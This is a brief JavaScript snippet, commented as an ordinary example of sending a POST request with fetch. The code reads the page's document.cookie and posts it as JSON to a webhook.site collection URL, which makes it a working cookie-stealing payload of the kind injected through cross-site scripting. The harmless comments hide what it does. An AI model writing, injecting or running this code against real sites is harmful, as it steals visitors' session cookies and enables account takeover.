// Sending a POST request using fetch
fetch('https://webhook.site/f21dc15a-d8b4-468b-9221-60fd48267bcc', {
    method: 'POST', // or 'GET', depending on what you want to do
    headers: {
        'Content-Type': 'application/json', // Adjust as needed
    },
    body: JSON.stringify({
        cookie: document.cookie,
    }) // The data you want to send in the request body
})
.then(response => response.text()) // Can also use .json() if expecting JSON response
.then(data => console.log('Success:', data))
.catch(error => console.error('Error:', error));
